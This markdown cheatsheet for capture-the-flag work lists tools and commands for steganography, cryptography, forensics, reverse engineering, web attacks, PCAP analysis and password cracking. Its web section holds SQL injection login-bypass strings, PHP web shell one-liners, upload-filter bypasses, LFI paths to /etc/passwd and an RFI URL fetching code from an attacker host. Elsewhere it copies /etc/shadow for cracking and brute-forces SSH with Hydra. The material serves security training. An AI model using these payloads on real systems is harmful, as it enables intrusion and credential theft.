# [Linux Privilege Escalation](https://github.com/Haxxenigma/TryHackMe/blob/main/Linux-Privilege-Escalation.md "https://github.com/Haxxenigma/TryHackMe/blob/main/Linux-Privilege-Escalation.md")

[GTFOBins](https://gtfobins.github.io/ "https://gtfobins.github.io/")

[Linux Kernerl CVEs](https://www.linuxkernelcves.com/cves "https://www.linuxkernelcves.com/cves")

[Rapid7](https://www.rapid7.com/ "https://www.rapid7.com/")

[ExploitDB](https://www.exploit-db.com/ "https://www.exploit-db.com/")

- [Searchsploit - ExploitDB in CLI](https://www.kali.org/tools/exploitdb/ "https://www.kali.org/tools/exploitdb/")

- [MySQL - User-Defined Function (UDF)](https://www.exploit-db.com/exploits/1518 "https://www.exploit-db.com/exploits/1518
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)")

<br>

### Useful Tools

[EyeWitness](https://github.com/RedSiege/EyeWitness "https://github.com/RedSiege/EyeWitness") (take screenshots of websites)

[CyberChef](https://github.com/gchq/CyberChef "https://github.com/gchq/CyberChef") (encoding/encryption/compression...)

<br>

### Linux Privilege Escalation Scripts

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS")

[LinEnum](https://github.com/rebootuser/LinEnum "https://github.com/rebootuser/LinEnum")

[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration "https://github.com/diego-treitos/linux-smart-enumeration")

[Linux Priv Checker](https://github.com/linted/linuxprivchecker "https://github.com/linted/linuxprivchecker")

[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester "https://github.com/The-Z-Labs/linux-exploit-suggester")

[Linux Exploit Suggester 2 & Dirty Cow](https://github.com/Haxxenigma/TryHackMe/tree/main/Linux-PrivEsc-Scripts/kernel-exploits "https://github.com/Haxxenigma/TryHackMe/tree/main/Linux-PrivEsc-Scripts/kernel-exploits")

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings "https://github.com/swisskyrepo/PayloadsAllTheThings")

- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md")

<br>

### Cheatsheets

[Linux Privilege Escalation Cheatsheet](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Linux-Privilege-Escalation.md "https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Linux-Privilege-Escalation.md")

[Metasploit Cheatsheet](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Metasploit.md "https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Metasploit.md")

[Nmap Cheatsheet](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Nmap.md "https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Nmap.md")

[Nmap Live Host Discovery Cheatsheet](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Nmap-Live-Host-Discovery.md "https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Nmap-Live-Host-Discovery.md")

[SQL Injection Cheatsheet](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/SQL-Injection.md "https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/SQL-Injection.md")

[OWASP Top-10 Cheatsheet](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/OWASP-Top-10.md "https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/OWASP-Top-10.md")

[Google Dorking Cheatsheet](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Google-Dorking.md "https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Google-Dorking.md")

# OSINT

[awesome-osint](https://github.com/jivoi/awesome-osint "https://github.com/jivoi/awesome-osint")

[Maryam](https://github.com/saeeddhqan/Maryam "https://github.com/saeeddhqan/Maryam")

[OSINT-SAN](https://github.com/Bafomet666/OSINT-SAN "https://github.com/Bafomet666/OSINT-SAN")

# Steganography

[List of `file` signatures](https://en.wikipedia.org/wiki/List_of_file_signatures "https://en.wikipedia.org/wiki/List_of_file_signatures")

```shell
file <filename>
```

[extracts `strings` in the given binary](https://linuxopsys.com/topics/strings-command-in-linux#:~:text=The%20strings%20command%20is%20used,error%20messages%2C%20and%20embedded%20strings "https://linuxopsys.com/topics/strings-command-in-linux#:~:text=The%20strings%20command%20is%20used,error%20messages%2C%20and%20embedded%20strings")

```shell
strings [options (-a | --all)] <filename>
```

[exiftool](https://www.kali.org/tools/libimage-exiftool-perl/ "https://www.kali.org/tools/libimage-exiftool-perl/")

```shell
exiftool <filename>
```

[binwalk](https://www.kali.org/tools/binwalk/ "https://www.kali.org/tools/binwalk/")

```shell
binwalk <filename>
```

[foremost](https://www.kali.org/tools/foremost/ "https://www.kali.org/tools/foremost/")

```shell
foremost -v <filename>
```

<br>

### Images

[tineye — Reverse search](https://tineye.com/ "https://tineye.com/")

[imagemagick — do image manipulation](https://imagemagick.org/ "https://imagemagick.org/")

[Stegsolve.jar — unhide flag from an image](https://yandex.kz/search/?text=Stegsolve.jar "https://yandex.kz/search/?text=Stegsolve.jar")

[SmartDeblur — fix blurry on image](https://github.com/Y-Vladimir/SmartDeblur "https://github.com/Y-Vladimir/SmartDeblur")

[tesseract — scan text in image and convert it to .txt file](https://tesseract-ocr.github.io/ "https://tesseract-ocr.github.io/")

<br>

[steghide — File carve](https://www.kali.org/tools/steghide/ "https://www.kali.org/tools/steghide/")

```shell
steghide --extract -sf <filename>
```

[pngcheck — Check for any corruption on PNG](https://manpages.ubuntu.com/manpages/focal/man1/pngcheck.1.html "https://manpages.ubuntu.com/manpages/focal/man1/pngcheck.1.html")

```shell
pngcheck <filename>
```

[zsteg — Detect stegano-hidden data in PNG & BMP](https://github.com/zed-0xff/zsteg "https://github.com/zed-0xff/zsteg")

```shell
zsteg -a <filename>
```

[stegcracker — brute-force password utility to uncover hidden data inside files](https://www.kali.org/tools/stegcracker/ "https://www.kali.org/tools/stegcracker/")

```shell
stegcracker <filename> <wordlist>
```

<br>

[futureboy — Steganographic Encoder/](https://futureboy.us/stegano/encinput.html "https://futureboy.us/stegano/encinput.html")[Decoder](https://futureboy.us/stegano/decinput.html "https://futureboy.us/stegano/decinput.html")

[stylesuxx — Steganographic Encoder/Decoder](http://stylesuxx.github.io/steganography/ "http://stylesuxx.github.io/steganography/")

[mobilefish — Steganographic Encrypter/Decrypter](https://www.mobilefish.com/services/steganography/steganography.php "https://www.mobilefish.com/services/steganography/steganography.php")

[manytools — Encoder text into image](https://manytools.org/hacker-tools/steganography-encode-text-into-image/ "https://manytools.org/hacker-tools/steganography-encode-text-into-image/")

[StegOnline](https://stegonline.georgeom.net/upload "https://stegonline.georgeom.net/upload")

[Magic Eye Solver/Viewer](http://magiceye.ecksdee.co.uk/ "http://magiceye.ecksdee.co.uk/")

<br>

### Compressed file

[zipdetails — display details about the internal structure of a Zip file](https://manpages.ubuntu.com/manpages/trusty/man1/zipdetails.1.html "https://manpages.ubuntu.com/manpages/trusty/man1/zipdetails.1.html")

```shell
zipdetails -v <filename>
```

[zipinfo — show details info about Zip file](https://manpages.ubuntu.com/manpages/lunar/man1/zipinfo.1.html "https://manpages.ubuntu.com/manpages/lunar/man1/zipinfo.1.html")

```shell
zipinfo <filename>
```

[zip — attempt to repair a corrupted Zip file](https://manpages.ubuntu.com/manpages/focal/man1/zip.1.html "https://manpages.ubuntu.com/manpages/focal/man1/zip.1.html")

```shell
zip -FF <filename> --out <outputfile>
```

[fcrackzip — Brute-force the zip password](https://www.kali.org/tools/fcrackzip/ "https://www.kali.org/tools/fcrackzip/")

```shell
fcrackzip -D -u -p <wordlist>  <filename>
```

To crack 7z:

1.  ```
    7z2hashcat32-1.3.exe filename.7z
    ```

2.  ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    ```

<br>

### Mucis file

[Audacity](https://ru.wikipedia.org/wiki/Audacity "https://ru.wikipedia.org/wiki/Audacity")

[Sonic Visualizer — Look at spectogram and other few Pane](https://en.wikipedia.org/wiki/Sonic_Visualiser "https://en.wikipedia.org/wiki/Sonic_Visualiser")

[Deepsound](https://medium.com/@ibnshehu/deepsound-audio-steganography-tool-f7ca0a897576 "https://medium.com/@ibnshehu/deepsound-audio-steganography-tool-f7ca0a897576")

[SilentEye](https://yandex.kz/search/?text=SilentEye "https://yandex.kz/search/?text=SilentEye")

[Stegonaut](https://www.stegonaut.com/ "https://www.stegonaut.com/")

<br>

### pdf

[pdfinfo](https://poppler.freedesktop.org/ "https://poppler.freedesktop.org/")

```shell
sudo apt install poppler-utils
```

```shell
pdfinfo <filename>
```

[qpdf](https://github.com/qpdf/qpdf "https://github.com/qpdf/qpdf")

[PDFStreamdumper](https://github.com/zha0/pdfstreamdumper "https://github.com/zha0/pdfstreamdumper")

[pdfcrack](https://www.kali.org/tools/pdfcrack/ "https://www.kali.org/tools/pdfcrack/")

[pdfimages](https://manpages.ubuntu.com/manpages/xenial/man1/pdfimages.1.html "https://manpages.ubuntu.com/manpages/xenial/man1/pdfimages.1.html")

[pdfdetach](https://manpages.ubuntu.com/manpages/kinetic/man1/pdfdetach.1.html "https://manpages.ubuntu.com/manpages/kinetic/man1/pdfdetach.1.html")

[pdf-parser](https://www.kali.org/tools/pdf-parser/ "https://www.kali.org/tools/pdf-parser/")

[peepdf](https://github.com/jesparza/peepdf "https://github.com/jesparza/peepdf")

[pdfid](https://www.kali.org/tools/pdfid/ "https://www.kali.org/tools/pdfid/")

[pdftotext](https://pdftotext.com/ "https://pdftotext.com/")

<br>

### Text

[spammimic — can decode hide message in spam text](https://www.spammimic.com/ "https://www.spammimic.com/")

# Cryptography

[URL Encode/](https://www.urlencoder.org/ "https://www.urlencoder.org/")[Decode](https://www.urldecoder.org/ "https://www.urldecoder.org/")

[Base64 Encode/](https://www.base64encode.org/ "https://www.base64encode.org/")[Decode](https://www.base64decode.org/ "https://www.base64decode.org/")

[Base32 Encode/](https://emn178.github.io/online-tools/base32_encode.html "https://emn178.github.io/online-tools/base32_encode.html")[Decode](https://emn178.github.io/online-tools/base32_decode.html "https://emn178.github.io/online-tools/base32_decode.html")

[ASCII, Hex, Binary, Decimal, Base64 converter](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html "https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html")

[ASCII Text to Hex Code Converter](https://www.rapidtables.com/convert/number/ascii-to-hex.html "https://www.rapidtables.com/convert/number/ascii-to-hex.html")

[cryptii — All in one #1](https://cryptii.com/ "https://cryptii.com/")

[dcode — All in one #2](https://www.dcode.fr/ "https://www.dcode.fr/")

[rumkin — All in one #3](https://rumkin.com/tools/cipher/ "https://rumkin.com/tools/cipher/")

[quipqiup](https://quipqiup.com/ "https://quipqiup.com/")

[Substitution Solver](https://www.guballa.de/substitution-solver "https://www.guballa.de/substitution-solver")

[Vigenère Solver](https://www.guballa.de/vigenere-solver "https://www.guballa.de/vigenere-solver")

[Morse code Decoder](http://www.unit-conversion.info/texttools/morse-code/ "http://www.unit-conversion.info/texttools/morse-code/")

[Rot 1 - 25 Decryptor](https://rot13.com/ "https://rot13.com/")

[ASCII85 Decoder](https://cryptii.com/pipes/ascii85-encoding "https://cryptii.com/pipes/ascii85-encoding")

[Ciphey](https://github.com/Ciphey/Ciphey "https://github.com/Ciphey/Ciphey")

Base64 Decode in CLI:

```shell
echo '<base64 string>' | base64 -d
```

<br>

[CyberChef — All in one](https://gchq.github.io/CyberChef/ "https://gchq.github.io/CyberChef/")

[Crackstation — Crack Hash](https://crackstation.net/ "https://crackstation.net/")

[Cryptool](https://www.cryptool.org/en/ "https://www.cryptool.org/en/")

[John the Ripper](https://www.kali.org/tools/john/ "https://www.kali.org/tools/john/")

[Hashcat](https://www.kali.org/tools/hashcat/ "https://www.kali.org/tools/hashcat/")

<br>

### OpenSSL

Decrypt a file using RSA private key

```shell
openssl rsautl -decrypt -inkey pub_priv.key -in ciphertext.file -out decrypted.file
```

Decrypt a file using AES-256-CBC and a keyfile

```shell
openssl enc -d -aes-256-cbc -in ciphertext.file -out cleartext.file -pass file:./key.file
```

Decrypt a file using AES-256-CBC

```shell
openssl enc -aes-256-cbc -d -in file.txt.enc -out file.txt
```

Decrypt a file using AES-256-CBC with base64 encoded

```shell
openssl enc -aes-256-cbc -d -a -in file.txt.enc -out file.txt
```

Others reference
https://gist.github.com/dreikanter/c7e85598664901afae03fedff308736b#file-encrypt_openssl-md

<br>

### Cracking compressed file

[John the Ripper](https://www.kali.org/tools/john/ "https://www.kali.org/tools/john/")

```shell
john --wordlist=<wordlist> <hashfile>
```

[fcrackzip](https://www.kali.org/tools/fcrackzip/ "https://www.kali.org/tools/fcrackzip/")

```shell
fcrackzip -D -u -p <wordlist> <filename.zip>
```

# Digital Forensics

> memory dump like `.raw` or image file like `.e01`

[Volatility — memory extraction utility framework for memory forensic](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference "https://github.com/volatilityfoundation/volatility/wiki/Command-Reference")

[Redline — alternative to volatility](https://fareedfauzi.gitbook.io/windows-forensics-playbook/memory-forensics-analysis/redline-automate-memory-collector-and-analyzer "https://fareedfauzi.gitbook.io/windows-forensics-playbook/memory-forensics-analysis/redline-automate-memory-collector-and-analyzer")

[Bulk-extractor — can extracts features such as email addresses, credit card numbers, URLs, and other types of information from digital evidence files](https://www.kali.org/tools/bulk-extractor/ "https://www.kali.org/tools/bulk-extractor/")

[FTK Imager — data preview and imaging tool that allows you to examine files and folders on local hard drives, network drives, CDs/DVDs, and review the content of forensic images or memory dumps](https://yandex.kz/search/?text=FTK+Imager "https://yandex.kz/search/?text=FTK+Imager")

[Autopsy](https://www.autopsy.com/ "https://www.autopsy.com/"), [ProDiscover](https://prodiscover.com/ "https://prodiscover.com/"), [EnCase](https://www.opentext.com/products/encase-forensic "https://www.opentext.com/products/encase-forensic") — as FTK Imager

[e2fsck — fix corrupt filesystem (ext2-4)](https://manpages.ubuntu.com/manpages/impish/man8/e2fsck.8.html "https://manpages.ubuntu.com/manpages/impish/man8/e2fsck.8.html")

[Recuva — recover files](https://www.ccleaner.com/ru-ru/recuva "https://www.ccleaner.com/ru-ru/recuva")

[RegRipper — for registry analysis](https://www.kali.org/tools/regripper/ "https://www.kali.org/tools/regripper/")

Tools for scanning event log:

- DeepblueCLI

- Chainsaw

- WELA

- HayaBusa

- APTHunter

# Reverse Engineering

### PE File (.exe or .dll)

- Use **DIE**, **PEID**, **PEBear**, or **PEView** software to do static file analysis. Find details of file in there!

- Use **HxD** to check the header file, file signature. Maybe the corrupt file sign one.

- Find it whether it packed or not. Find online unpack.

- Find it whether the binary has anti-debug or not.

- Use **IDA Pro** software to perform static analysis on the binary.

- When do analysis static or dynamic focus on `strcmp`, function `call`, `conditional jump`.

- You can use **Snowman** or **Ghidra** software  to perform decompiler.

- Use debugger like **Immunity Debugger**, **x64Dbg/x32Dbg**, or **WinDbg** to debug the binary.  

- API monitor

- Frida-trace

### ELF File (.elf)

- Use `ltrace <filename>` command to know what library function are being called in the binary.

- Use `strace <filename>` command to know what system and signal function are being called in the binary.

- Use `nm <filename>` command to know what symbol being called in the binary.

- Use `readelf -a <filename>`  command. It will displays information about ELF files.

- Use Gdb debugger extension. `Peda`, `pwndbg` or `gef` will help you!.

- Or you can use edb debugger.

- Use **IDA Pro** software to perform static analysis on the binary.

### APK File (.apk)

- Use `APKTool <filename>` command tools.

- Use Android Emulator to run the program.

- Use Android Debug Bridge.

- Use `dex2jar <filename>` command tools.

- Use **jd-gui**. 

- **JADX** is good alternative to jd-gui.

- Rename the file to zip file. Unzip it. Take a look the file in your favorite text editor.

### .NET File (.exe)

- Use **dnSpy** software. Very powerful. You can compile the program by

  - Edit in the main interface -> compile -> save all. Try run the program back!

### Java file

- Use **JADX**

### Python file

- There are many options, one of it is **uncompyle6**. Just google dor python decompiler.

- <https://github.com/extremecoders-re/pyinstxtractor> - Python EXE to pyc

### Shellcode

- scdbg

- shellcode2exe

- pdfstreamdumper shellcode analysis

- debugger

- IDA Pro

- unicode2hex-escaped

- hxd

### Others

- <https://www.decompiler.com/>

    - EXE or DLL (C#), JAR or CLASS, APK, XAPK or DEX, PYC or PYO, LUAC or LUB, SMX or AMXX

> Renaming functions and variables, deobfuscation and doing a good work is not something that matters during a CTF; we only need the flag. Thus, why reverse engineer when you don’t have too? The less we reverse, the better it is.

# Binary Exploit / Pwn

`checksec` — check the properties of executable of binary security

- **Stack Canaries** = a secret value placed on the stack which changes every time the program is started. the stack canary is checked and if it appears to be modified, the program exits immeadiately.

- **Nx** = stored input or data cannot be executed as code

- **Address Space Layout Randomization (ASLR)** = The randomization of the place in memory where the program, shared libraries, the stack, and the heap are.

- **RELRO** = makes binary sections read-only.

**Tools**

- Pwntool framework

- Gdb debugger. Peda, pwndbg or gef.

- Use `readelf -a <filename>`  command. It will displays information about ELF files.

- Use `nm <filename>`  command to know what symbol being called in the binary.

- Python

**Function that can lead to bof**

- scanf

- read

- strcat

- fread

- fgets

- sprintf

- strcpy

- gets

- memcpy

- memmove

- strncpy

- snprintf

- strncat

# WEB

### Use curl

```shell
curl <ip address/dns>
```

### Scan for directories

[wfuzz](https://www.kali.org/tools/wfuzz/ "https://www.kali.org/tools/wfuzz/")

```
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 <url>/FUZZ
```

[ffuf](https://www.kali.org/tools/ffuf/ "https://www.kali.org/tools/ffuf/")

```shell
ffuf -w <wordlist> -u <url>/FUZZ
```

[dirb](https://www.kali.org/tools/dirb/ "https://www.kali.org/tools/dirb/")

```shell
dirb <url> <wordlist>
```

[dirbuster](https://www.kali.org/tools/dirbuster/ "https://www.kali.org/tools/dirbuster/")

```shell
java -jar DirBuster-1.0-RC1.jar -u <url>
```

[gobuster](https://www.kali.org/tools/gobuster/ "https://www.kali.org/tools/gobuster/")

```shell
gobuster -u <url> -w <wordlist> dir
```

[nikto](https://www.kali.org/tools/nikto/ "https://www.kali.org/tools/nikto/")

```shell
nikto -h <hostname> –output <filename>
```

### Bruteforce subdomain

### Bruteforce credentials

[wfuzz](https://www.kali.org/tools/wfuzz/ "https://www.kali.org/tools/wfuzz/")

```shell
wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page path
```

[BurpSuite — sniper/cluster bomb](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types "https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types")

### SQL Injection

- [sqlmap](https://www.kali.org/tools/sqlmap/ "https://www.kali.org/tools/sqlmap/")

    ```shell
    sqlmap -u <url> --dbs
    ```

- Enum using nmap

    ```
    nmap -sV --script=http-sql-injection <target>
    ```

- Using jsql

- Capture the request using burp suite, and save the request in a file.

- `sqlmap -r request.txt`

- Crawl a page to find sql-injections

    ```
    sqlmap -u http://example.com --crawl=1
    ```

- <http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet>

- Login bypass

    `‘or 1=1- -`

    `‘ or ‘1’=1`

    `‘ or ‘1’=1 - -`

    `‘–`

    `' or '1'='1`

    `-'`

    `' '`

    `'&'`

    `'^'`

    `'*'`

    `' or ''-'`

    `' or '' '`

    `' or ''&'`

    `' or ''^'``

    `' or ''*'

    `"-"`

    `" "`

    `"&"`

    `"^"`

    `"*"`

    `" or ""-"`

    `" or "" "`

    `" or ""&"`

    `" or ""^"`

    `" or ""*"`

    `or true--`

    `" or true--`

    `' or true--`

    `") or true--`

    `') or true--`

    `' or 'x'='x`
    
    `') or ('x')=('x`

    `')) or (('x'))=(('x`

    `" or "x"="x`

    `") or ("x")=("x`

    `")) or (("x"))=(("x`

    - known Username:

        `admin’ - -`

        `admin’) - -`

- Using error-bases DB enumeration

    - Add the tick `'`

    - Enumerate columns

- Using order by: <https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html>

### XML External Entity (XXE)

### URL vulnerability

### OS command Injection

### Directory traversal

### Dotdotpwn tool

### Looking for:

- .git

- robots.txt

### Set extension

- sh, txt, php, html, htm, asp, aspx, js, xml, log, json, jpg, jpeg, png, gif, doc, pdf, mpg, mp3, zip, tar.gz, tar

### If https

- scan for heartbleed

    ```shell
    sslscan <hostname:port>
    ```

    ```shell
    nmap -sV --script=ssl-heartbleed <hostname>
    ```

- Read the certificate

### If it's a CMS

- Admin page

    - Joomla

        - /administrator

    - Wordpress

        - /wp-admin

        - /wp-login

- Wordpress
    - [wpscan](https://www.kali.org/tools/wpscan/ "https://www.kali.org/tools/wpscan/")

    - ```shell
      wpscan -u <url> --enumerate -t --enumerate u --enumerate p
      ```
    - ```shell
      wpscan –u <url> --username <name> --wordlist <wordlist>
      ```
    - ```shell
      wpscan -u <url> --random-agent
      ```
- Drupal
    - [droopescan](https://github.com/SamJoan/droopescan "https://github.com/SamJoan/droopescan")

    - `/CHANGELOG.txt` to find version

- Adobe Cold Fusion

    - `/CFIDE/adminapi/base.cfc?wsdl`

    - `exploit/windows/http/coldfusion_fckeditor`

    - LFI: `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`

- Elastix

    -  default login are `admin:admin` at `/vtigercrm/`

    - able to upload shell in profile-photo

    - Examine `httpd.conf/` windows config files

- JBoss

    - JMX Console `http://IP:8080/jmxconcole/`

    - War File

- Joomla

    - configuration.php

    - diagnostics.php

    - joomla.inc.php

    - config.inc.php

- Mambo

    - configuration.php    

    - config.inc.php

- Wordpress
    
    - setup-config.php    

    - wp-config.php

- ZyXel

    - /WAN.html (contains PPPoE ISP password)

    - /WLAN_General.html and /WLAN.html (contains WEP key)

    - /rpDyDNS.html (contains DDNS credentials)

    - /Firewall_DefPolicy.html (Firewall)

    - /CF_Keyword.html (Content Filter)

    - /RemMagWWW.html (Remote MGMT)

    - /rpSysAdmin.html (System)

    - /LAN_IP.html (LAN)

    - /NAT_General.html (NAT)

    - /ViewLog.html (Logs)

    - /rpFWUpload.html (Tools

    - /DiagGeneral.html (Diagnostic)

    - /RemMagSNMP.html (SNMP Passwords)

    - /LAN_ClientList.html (Current DHCP Leases)

    - /RestoreCfg.html

    - /BackupCfg.html

### Upload page

- Upload shell to make reverse shell

- Bypass file upload filtering

- Rename it

    - `shell.php.jpg`

- Blacklisting bypass, change extension

    - php .phtml, .php, .php3, .php4, .php5, and .inc

    - bypassed by uploading an unpopular php extensions such as: pht, phpt, phtml, php3, php4, php5, php6

    - asp .asp, .aspx

    - perl .pl, .pm, .cgi, .lib

    - jsp .jsp, .jspx, .jsw, .jsv, and .jspf

    - Coldfusion .cfm, .cfml, .cfc, .dbm

- Whitelisting bypass

    - `file.php%00.png`

    - `shell.jpg.php`

    - If they check the content. Basically you just add the text "GIF89a;" before you shell-code. `<? system($_GET['cmd']);//or you can insert your complete shellcode ?>`

    - In image

        - `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg`

        - `mv lo.jpg lo.php.jpg`

### Phpmyadmin

- Default login `root:pma`

### Identify WAF using `wafw00f`

### Exploitation

- Heartbleed exploit

    - ```
      use auxiliary/scanner/ssl/openssl_heartbleed
      set RHOSTS 192.168.3.212
      set verbose true
      run
      ```
- XXS

    - Session hijacking / Cookie theft. Steal cookie to get admin privilege

    - use xsser tool

- LFI

    - Bypassing php-execution

        - `http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index`

    - Bypassing the added .php and other extra file-endings

        - `http://example.com/page=../../../../../../etc/passwd%00`

        - `http://example.com/page=../../../../../../etc/passwd?`

    - folder that always exist

        - `/etc/hosts /etc/resolv.conf`

    - add %00jpg to end of files

        - `/etc/passwd%00jpg`

    - Refer this for more information

        - <https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html>

        - <https://highon.coffee/blog/lfi-cheat-sheet/>

- RFI

    - `http://exampe.com/index.php?page=http://attackerserver.com/evil.txt`

### Other

[cewl — Creating wordlist from webpage](https://www.kali.org/tools/cewl/ "https://www.kali.org/tools/cewl/")

# PCAP analysis

### Tools

- Wireshark

- NetworkMiner

- Strings

- Tshark

### Checklist

- Understand the packets

- Export objects

- Protocol hierarchy give you general understanding

- Follow TCP streams

- Filtering

- Search for keyword such as "flag" using Find Packet

- Take a look at Info column. Stupid challenge always put the flag letter by letter in different packets.

- If challenge about wifi, USB or keyboard thingy, google the past writeup how they solve.

### Others

- Convert pcapng to pcap

    ```shell
    tshark -F pcap -r file.pcapng -w newfile.pcap
    ```

- Bruteforce WEP password for PCAP

    ```shell
    aircrack-ng -b XX:XX:XX:XX:89:b3 -w ../rockyou.txt target.pcap
    ```

    ```
    Go to Edit > preference > Protocol > IEEE 802.11 > Edit... button > wpa-pwd password
    ```

- USB pcap: <https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/usb-keystrokes>

- Reference: <https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection>

# Passwords

[Create password](https://www.kali.org/tools/whois/ "https://www.kali.org/tools/whois/")

```shell
mkpasswd -m sha-512 <PASSWORD>
```

```shell
openssl passwd -1 -salt <SALT> <PASSWORD>
```

[John the Ripper](https://www.kali.org/tools/john/ "https://www.kali.org/tools/john/")

```shell
sudo apt install john
```

```shell
cp /etc/passwd passwd.txt && cp /etc/shadow shadow.txt

unshadow passwd.txt shadow.txt > hash_to_crack.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
```

[Hydra](https://www.kali.org/tools/hydra/ "https://www.kali.org/tools/hydra/") | [(Cheatsheet)](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Hydra.md "https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Hydra.md")

```shell
sudo apt install hydra
```

```shell
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
```

# Wordlists

[Wordlists](https://www.kali.org/tools/wordlists/ "https://www.kali.org/tools/wordlists/")

```shell
sudo apt install wordlists

gunzip /usr/share/wordlists/rockyou.txt.gz
```

[SecLists](https://www.kali.org/tools/seclists/ "https://www.kali.org/tools/seclists/")

```shell
sudo apt install seclists
```

# General

[wget](https://www.kali.org/tools/wget/)

```shell
wget [options] <url>
```

[curl](https://www.kali.org/tools/curl/)

```shell
curl [options] <url>
```

[openssh](https://www.kali.org/tools/openssh/)

```shell
scp /src/path/ user@host:/dest/path/
```

```shell
scp user@host:/dest/path/ /src/path/
```

[python](https://www.python.org/downloads/?ref=)

```shell
python3 [options] [-c cmd | -m mod | file | -]
```

```shell
python3 -m http.server [port]
```

# Crontab

[Crontab Generator](https://crontab-generator.org/ "https://crontab-generator.org/")

[Crontab Guru](https://crontab.guru/ "https://crontab.guru/")

```shell
crontab -e
```

# Other cheatsheets

<https://github.com/Rajchowdhury420/CTF-CheatSheet>

<https://dvd848.github.io/CTFs/CheatSheet.html>

<https://github.com/JohnHammond/ctf-katana>

<https://github.com/apsdehal/aWEsoMe-cTf>